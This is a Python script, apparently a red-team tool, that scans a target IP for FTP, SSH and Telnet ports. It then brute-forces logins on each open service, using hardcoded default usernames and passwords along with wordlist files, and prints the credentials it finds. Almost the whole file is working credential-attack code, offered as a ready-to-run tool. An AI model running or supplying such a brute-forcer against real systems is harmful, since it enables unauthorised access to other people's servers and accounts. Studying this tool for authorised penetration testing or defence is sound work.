import os
import sys
import socket
import ftplib
import paramiko
import telnetlib
from termcolor import colored

PASS_MASTER = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), "bases",
                           "passwords_master")

base_usernames = ("root", "admin", "user", "administrator", "username", "pass", "password", "USER", "USERNAME", "ROOT",
                  "PASS", "PASSWORD", "ADMIN", "ADMINISTRATOR", "User", "Username", "Pass", "Password", "Root", "Admin",
                  "Administrator")
base_passwords = ("root", "admin", "user", "administrator", "username", "pass", "password", "USER", "USERNAME", "ROOT",
                  "PASS", "PASSWORD", "ADMIN", "ADMINISTRATOR", "User", "Username", "Pass", "Password", "Root", "Admin",
                  "Administrator")
profile_ports = (21, 22, 23)


def show_banner():
    banner = """
           🔓 B R U T E --- F O R C E 🔓
            |---------------------------|
            |     [*] [*] [*] [*]       |
            | Work smarter, not harder) |
            |---------------------------|
    """
    print(banner)
    print(colored("    [🔓] Script mode: ", "light_yellow") + colored("🔴 Red SWAT", "red"))
    print(colored("    [🔓️] Function: ", "light_yellow") + colored("Launch brute force\n", "red"))


def scan_profile_ports(targetIP, ports):
    isPort21 = False
    isPort22 = False
    isPort23 = False
    for port in ports:
        sock = socket.socket()
        sock.settimeout(0.07)
        try:
            sock.connect((targetIP, port))
            if port == 21:
                isPort21 = True
            if port == 22:
                isPort22 = True
            if port == 23:
                isPort23 = True
            print(colored(f"[+] Port {port} is AVAILABLE!", "cyan"))
        except:
            pass
    sock.close()
    return isPort21, isPort22, isPort23


def brute_force(service, targetIP, wordlist_master):
    for user in base_usernames:
        for passwd in base_passwords:
            if service(targetIP, user, passwd):
                print(colored(f"[+] Found correct user: {user}", "green"))
                print(colored(f"[+] Found correct passwd: {passwd}", "green"))
                return user, passwd

    for filename in os.listdir(wordlist_master):
        filepath = os.path.join(wordlist_master, filename)
        with open(filepath, "r", encoding="utf-8", errors="ignore") as file:
            for passwd in file:
                passwd = passwd.strip()
                for user in base_usernames:
                    if service(targetIP, user, passwd):
                        print(colored(f"[+] Found correct user: {user}"))
                        print(colored(f"[+] Found correct passwd: {passwd}"))
                        return user, passwd
    return None


def log_to_ftp(targetIP, usr, passwd):
    ftp = ftplib.FTP(targetIP)
    try:
        ftp.login()
        print(colored("[+] Connected to FTP!", "green"))
        return True
    except:
        try:
            ftp.login(usr, passwd)
            print(colored("[+] Connected to FTP!", "green"))
            return True
        except:
            return False


def log_to_telnet(targetIP, usr, passwd):
    telnet = telnetlib.Telnet(targetIP, port=23)
    try:
        telnet.read_until(b"login: ")
        telnet.write(usr.encode("ascii") + b"\n")

        telnet.read_until(b"Password: ")
        telnet.write(passwd.encode("ascii") + b"\n")

        result = telnet.read_some()
        if b"Welcome" in result:
            telnet.close()
            print(colored("[+] Connected to Telnet!", "green"))
            return True
    except:
        telnet.close()
        return False

def log_to_ssh(targetIP, usr, passwd):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(
            hostname=targetIP,
            username=usr,
            password=passwd,
            port=22,
            timeout=3.5
        )
        ssh.close()
        print(colored("[+] Connected to SSH!", "green"))
        return True
    except:
        ssh.close()
        return False


show_banner()
if len(sys.argv) > 1:
    targetIP = sys.argv[1]
else:
    targetIP = input(colored("[*] Enter the targetIP"))
p21, p22, p23 = scan_profile_ports(targetIP, profile_ports)
if p21:
    print(colored("[*] Trying to connect to FTP...", "yellow"))
    brute_force(log_to_ftp, targetIP, PASS_MASTER)
if p22:
    print(colored("[*] Trying to connect to SSH...", "yellow"))
    brute_force(log_to_ssh, targetIP, PASS_MASTER)
if p23:
    print(colored("[*] Trying to connect to Telnet...", "yellow"))
    brute_force(log_to_telnet, targetIP, PASS_MASTER)